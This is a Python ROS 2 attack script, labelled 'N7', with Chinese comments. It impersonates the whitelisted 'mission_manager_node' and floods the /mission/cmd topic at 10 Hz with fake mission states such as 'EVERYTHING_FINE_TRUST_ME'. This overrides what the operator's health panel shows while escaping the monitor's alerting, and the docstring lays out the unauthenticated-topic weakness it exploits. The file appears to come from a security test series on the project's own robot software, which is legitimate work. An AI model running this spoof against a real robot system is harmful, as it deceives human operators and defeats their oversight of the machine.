#!/usr/bin/env python3
"""攻擊 N7 — Direct /mission/cmd spoof (跳過 mission_manager).

漏洞：
    system_status_node._on_mission 訂閱 /mission/cmd，但 publisher 端
    沒有身份驗證、沒有 HMAC。
    任何人都能 publish 任意字串 → system_status 直接更新 _mission_status →
    /system/health 顯示在 operator 面前。

對比 N6：
    N6 攻擊 /sensor/status（mission_manager 的輸入）→ 透過 mission_manager 轉發
    N7 攻擊 /mission/cmd（mission_manager 的輸出）→ 直接覆蓋 operator 看到的字

    意義：「即使 N6 被修補（mission_manager 加 publisher 驗證），N7 仍能直達」
    操作者面板的 mission state 完全在攻擊者掌控。

加碼：偽裝為白名單上的「mission_manager_node」 → monitor 不會 alert
"""
import sys
import time
import rclpy
from rclpy.node import Node
from std_msgs.msg import String


WHITELISTED_NAME = 'mission_manager_node'


class MissionCmdSpoofer(Node):

    def __init__(self):
        super().__init__(WHITELISTED_NAME)
        self._pub = self.create_publisher(String, '/mission/cmd', 10)
        # 高頻 publish（10Hz）保證覆蓋真 mission_manager 的 1Hz 輸出
        self._tick = 0
        self.create_timer(0.1, self._publish_lie)
        self.get_logger().error(
            f'🕵️ 偽裝為「{WHITELISTED_NAME}」（白名單），10Hz publish 假 /mission/cmd'
        )

    def _publish_lie(self):
        self._tick += 1
        # 切換 3 種狀態：PATROL（騙說沒事）/ ATTACKER_LIE / FAKE_NORMAL
        if self._tick % 30 < 10:
            text = 'PATROL'
        elif self._tick % 30 < 20:
            text = 'ATTACKER_OWNED_MISSION_STATE'
        else:
            text = 'EVERYTHING_FINE_TRUST_ME'
        m = String()
        m.data = text
        self._pub.publish(m)
        if self._tick % 10 == 0:
            self.get_logger().warn(
                f'  [t={self._tick/10:.0f}s] 假 mission: {text}'
            )


def main():
    rclpy.init()
    node = MissionCmdSpoofer()
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 20.0
    deadline = time.monotonic() + duration
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.5)
    finally:
        node.get_logger().error('⏹ 結束（system_status 從頭到尾接受攻擊者的 mission 字串）')
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
